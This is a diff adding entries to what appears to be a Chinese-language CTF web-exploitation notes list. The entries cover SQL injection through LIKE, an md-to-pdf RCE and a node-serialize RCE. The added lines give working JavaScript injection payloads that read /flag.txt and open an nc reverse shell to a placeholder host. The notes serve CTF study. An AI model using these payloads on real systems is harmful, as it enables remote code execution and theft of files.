@@ -2712,3 +2712,8 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 275. [cps remastered](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/web/cps),[wp](https://github.com/quasar098/ctf-writeups/tree/main/amateursctf-2023/cps-remastered)
 - insert语句处的sql注入。无错误回显所以无法报错注入爆出信息。但是可以利用LIKE语句从数据库里拿出数据后在注册的用户名处回显
     - 如果有update权限的话甚至可以把flag提取到password字段 https://ireland.re/posts/AmateursCTF/
+276. markdown to pdf(md-to-pdf) RCE: https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880
+- 读文件payload：`((require("child_process")).execSync("cat /flag.txt"))`,`((require("fs")).readFileSync("/flag.txt"))`
+- 反弹shell payload:`((require("child_process")).execSync("nc ip port -e /bin/sh"))`
+- alpine container包含的功能很少，比如没有bash
+277. [Node Serialize](https://github.com/luin/serialize/tree/master) rce：https://blog.websecurify.com/2017/02/hacking-node-serialize （从Exploit Setup开始是漏洞详细信息）
